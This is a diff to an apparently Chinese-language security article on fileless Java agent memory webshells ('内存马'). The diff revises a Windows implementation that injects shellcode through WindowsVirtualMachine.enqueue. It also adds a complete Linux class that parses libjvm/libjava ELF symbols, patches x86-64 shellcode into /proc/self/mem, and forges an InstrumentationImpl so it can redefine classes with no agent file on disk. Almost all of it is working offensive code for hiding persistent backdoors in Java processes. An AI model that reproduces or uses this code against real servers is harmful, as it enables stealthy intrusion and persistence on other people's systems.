@@ -446,6 +446,8 @@ agent内存马分为有文件落地和无文件落地两种方式，无文件落
 
 通过以上的步骤，就无需通过agent技术即可实现动态修改类字节码,但是问题来了，这个方式只能修改当前Java进程的字节码，无法注入到其他Java进程，如果希望修改其他Java进程加载类的字节码，还是得通过agent技术
 
+#### Windows实现
+
 ```java
 import sun.instrument.InstrumentationImpl;
 import sun.misc.Unsafe;
@@ -533,9 +535,8 @@ public class NoFileAgent {
     }
 
     private void runShellCode(byte[] shellCode) throws Exception {
-        byte[] classBytes = Base64.getDecoder().decode("yv66vgAAADQAIAoABQAWCAAXCgAYABkHABoHABsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAKExzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZTsBAAtvcGVuUHJvY2VzcwEABChJKUoBAApFeGNlcHRpb25zBwAcAQAHZW5xdWV1ZQEAPShKW0JMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9PYmplY3Q7KVYBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBABpXaW5kb3dzVmlydHVhbE1hY2hpbmUuamF2YQwABgAHAQAGYXR0YWNoBwAdDAAeAB8BACZzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZQEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAC2xvYWRMaWJyYXJ5AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABAAFAAAAAAAEAAEABgAHAAEACAAAAC8AAQABAAAABSq3AAGxAAAAAgAJAAAABgABAAAABQAKAAAADAABAAAABQALAAwAAAEIAA0ADgABAA8AAAAEAAEAEAGIABEAEgABAA8AAAAEAAEAEAAIABMABwABAAgAAAAiAAEAAAAAAAYSArgAA7EAAAABAAkAAAAKAAIAAAALAAUADAABABQAAAACABU=");
-        Class clazz = new Loader().load(classBytes);
-        Method enqueue = clazz.getDeclaredMethod("enqueue",long.class,byte[].class,String.class,String.class,Object[].class);
+        Class clazz = Class.forName("sun.tools.attach.WindowsVirtualMachine");
+        Method enqueue = clazz.getDeclaredMethod("enqueue", long.class, byte[].class, String.class, String.class, Object[].class);
         enqueue.setAccessible(true);
         enqueue.invoke(null, -1, shellCode, null, null, new Object[]{});
     }
@@ -549,12 +550,191 @@ public class NoFileAgent {
             return null;
         }
     }
+}
+```
 
-    private static class Loader extends ClassLoader
-    {
-        public  Class load(byte[] b) {
-            return super.defineClass(b, 0, b.length);
+#### Linux实现
+
+```cpp
+import sun.instrument.InstrumentationImpl;
+import sun.misc.Unsafe;
+import java.io.BufferedReader;
+import java.io.FileReader;
+import java.io.RandomAccessFile;
+import java.lang.instrument.ClassDefinition;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+
+public class NoFileAgentForLinux {
+    private static final int SHT_DYNSYM =  11;
+    private static final int STT_FUNC =  2;
+    private static final int STT_GNU_IFUNC =  10;
+    private InstrumentationImpl inst;
+    private Unsafe unsafe;
+
+    public NoFileAgentForLinux() {
+        this.unsafe = getUnsafe();
+        this.inst = getInstrumentationImpl();
+    }
+    public void inject(String className, byte[] classBody) throws Exception {
+        if(this.inst == null){
+            return;
         }
+        ClassDefinition definition = new ClassDefinition(Class.forName(className), classBody);
+        Method redefineClazz = InstrumentationImpl.class.getMethod("redefineClasses", ClassDefinition[].class);
+        redefineClazz.invoke(this.inst, new Object[]{new ClassDefinition[]{definition}});
+    }
+
+    private InstrumentationImpl getInstrumentationImpl(){
+        try {
+            Class<?> instClazz = Class.forName("sun.instrument.InstrumentationImpl");
+            Constructor<?> constructor = instClazz.getDeclaredConstructor(long.class, boolean.class, boolean.class);
+            constructor.setAccessible(true);
+            return (InstrumentationImpl)constructor.newInstance(getJPLISAgentPointer(), true, false);
+        }catch (Exception e){
+            return null;
+        }
+    }
+
+    private long getJPLISAgentPointer() throws Exception {
+        long randomAccessFileLength = 0, JNIGetCreatedJavaVMs = 0;
+        FileReader fin  = new FileReader("/proc/self/maps");
+        BufferedReader reader = new BufferedReader(fin);
+        String line;
+        while ((line = reader.readLine()) != null)
+        {
+            String[] splits = line.trim().split(" ");
+            if(line.endsWith("libjava.so") && randomAccessFileLength == 0) {
+                String[] addr_range = splits[0].split("-");
+                long libbase = Long.parseLong(addr_range[0], 16);
+                String elfpath = splits[splits.length - 1];
+                randomAccessFileLength = getFunctionPointer(libbase,elfpath, "Java_java_io_RandomAccessFile_length");
+            }else if(line.endsWith("libjvm.so") && JNIGetCreatedJavaVMs == 0) {
+                String[] addr_range = splits[0].split("-");
+                long libbase = Long.parseLong(addr_range[0], 16);
+                String elfpath = splits[splits.length - 1];
+                JNIGetCreatedJavaVMs = getFunctionPointer(libbase,elfpath, "JNI_GetCreatedJavaVMs" );
+            }
+            if(JNIGetCreatedJavaVMs != 0 && randomAccessFileLength != 0)
+                break;
+        }
+        fin.close();
+        if(randomAccessFileLength == 0 || JNIGetCreatedJavaVMs == 0){
+            return 0;
+        }
+        byte[] shellCode = {
+                (byte)0x55, (byte)0x48, (byte)0x89, (byte)0xe5, (byte)0x48, (byte)0x31, (byte)0xc0, (byte)0xb0, (byte)0x0f, (byte)0x48, (byte)0xf7, (byte)0xd0, (byte)0x48, (byte)0x21, (byte)0xc4,
+                (byte)0x48, (byte)0xb8, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x00, (byte)0x48, (byte)0x83, (byte)0xEC, (byte)0x40, (byte)0x48,
+                (byte)0x31, (byte)0xF6, (byte)0x48, (byte)0xFF, (byte)0xC6, (byte)0x48, (byte)0x8D, (byte)0x54, (byte)0x24, (byte)0x04, (byte)0x48, (byte)0x8D, (byte)0x7C, (byte)0x24, (byte)0x08,
+                (byte)0xFF, (byte)0xD0, (byte)0x48, (byte)0x8B, (byte)0x7C, (byte)0x24, (byte)0x08, (byte)0x48, (byte)0x8D, (byte)0x74, (byte)0x24, (byte)0x10, (byte)0xBA, (byte)0x00, (byte)0x02,
+                (byte)0x01, (byte)0x30, (byte)0x48, (byte)0x8B, (byte)0x07, (byte)0xFF, (byte)0x50, (byte)0x30, (byte)0x48, (byte)0x8B, (byte)0x44, (byte)0x24, (byte)0x10, (byte)0xC9, (byte)0xC3
+        };
+        byte[] stub = longToLittleEndianBytes(JNIGetCreatedJavaVMs,8);
+        System.arraycopy(stub, 0, shellCode, 17, stub.length);
+        RandomAccessFile fout = new RandomAccessFile("/proc/self/mem", "rw");
+        byte[] backup = new byte[shellCode.length];
+        fout.seek(randomAccessFileLength);
+        fout.read(backup);
+        fout.seek(randomAccessFileLength);
+        fout.write(shellCode);
+        fout.close();
+        long jvmtiEnvPointer = fout.length(); //触发执行shellCode得到jvmtiEnv指针
+        //恢复代码
+        fout = new RandomAccessFile("/proc/self/mem", "rw");
+        fout.seek(randomAccessFileLength);
+        fout.write(backup);
+        fout.close();
+        long JPLISAgent = this.unsafe.allocateMemory(0x1000);
+        this.unsafe.putLong(JPLISAgent + 8, jvmtiEnvPointer);
+        this.unsafe.putByte(jvmtiEnvPointer+361,(byte) 2);
+        return JPLISAgent;
+    }
+
+    private long getFunctionPointer(long baseAddress, String libraryName, String functionName) throws Exception {
+        try (RandomAccessFile fin = new RandomAccessFile(libraryName, "r")){
+            if(Integer.reverseBytes(fin.readInt()) != 1179403647){ //魔数校验
+                return 0;
+            }
+            fin.seek(0x28);
+            long e_shoff = Long.reverseBytes(fin.readLong()); //节区头表偏移量
+            fin.seek(0x3a);
+            short e_shentsize = Short.reverseBytes(fin.readShort()); //节区头表每个表项的大小
+            fin.seek(0x3c);
+            short e_shnum = Short.reverseBytes(fin.readShort()); //节区头表表项的数目
+            long pshoff = e_shoff;
+            long sh_offset = 0;
+            long sh_size = 0;
+            int sh_link = 0;
+            long sh_entsize = 0;
+            for (short i = 0; i < e_shnum; i++) { //遍历节区头表
+                fin.seek(pshoff + 0x4);
+                int sh_type = Integer.reverseBytes(fin.readInt()); //对应节的类型
+                if(sh_type != SHT_DYNSYM) //判断对应节的类型是否是动态符号表
+                {
+                    pshoff += 64;
+                    continue;
+                }
+                fin.seek(pshoff + 0x18);
+                sh_offset = Long.reverseBytes(fin.readLong()); //动态符号表的偏移量
+                fin.seek(pshoff + 0x20);
+                sh_size = Long.reverseBytes(fin.readLong()); //动态符号表的大小
+                fin.seek(pshoff + 0x28);
+                sh_link = Integer.reverseBytes(fin.readInt()); //动态符号表使用的字符串所位于节区头表的下标索引
+                fin.seek(pshoff + 0x38);
+                sh_entsize = Long.reverseBytes(fin.readLong()); //动态符号表中每个条目的大小
+                break;
+            }
+            long psymstr = sh_offset;
+            long count = sh_size / sh_entsize; //动态符号表数组的长度
+            long pshdr = e_shoff + ((long) sh_link * e_shentsize);//符号表字符串表项指针
+            fin.seek(pshdr + 0x18);
+            long shdr_sh_offset = Long.reverseBytes(fin.readLong()); //符号表字符串表的偏移量
+            int st_name;
+            byte st_info;
+            long st_value;
+            for (long i = 0; i < count; i++) {  //遍历动态符号表的条目
+                fin.seek(psymstr);
+                st_name = Integer.reverseBytes(fin.readInt()); //符号名称在符号表字符串表中的偏移量
+                fin.seek(psymstr + 4);
+                st_info = (byte)(fin.readByte() & 0x0f); //符号的类型
+                fin.seek(psymstr + 8);
+                st_value = Long.reverseBytes(fin.readLong()); //符号的偏移量
+                if (st_name == 0 || st_value == 0 || (st_info != STT_FUNC && st_info != STT_GNU_IFUNC)) {
+                    psymstr += sh_entsize;
+                    continue;
+                }
+                fin.seek(shdr_sh_offset + st_name);
+                StringBuilder name = new StringBuilder();
+                byte ch;
+                while((ch = fin.readByte()) != 0)
+                {
+                    name.append((char) ch);
+                }
+                if(name.toString().equals(functionName)){
+                    return baseAddress + st_value;
+                }
+                psymstr += sh_entsize;
+            }
+        }
+        return 0;
+    }
+
+    private Unsafe getUnsafe() {
+        try{
+            Field field = Class.forName("sun.misc.Unsafe").getDeclaredField("theUnsafe");
+            field.setAccessible(true);
+            return (Unsafe) field.get(null);
+        }catch(Exception e){
+            return null;
+        }
+    }
+    private byte[] longToLittleEndianBytes(long value, int pointerLength) {
+        byte[] bytes = new byte[pointerLength];
+        for (int i = 0; i < 8; i++) {
+            bytes[i] = (byte) (value >>> (i * 8));
+        }
+        return bytes;
     }
 }
 ```
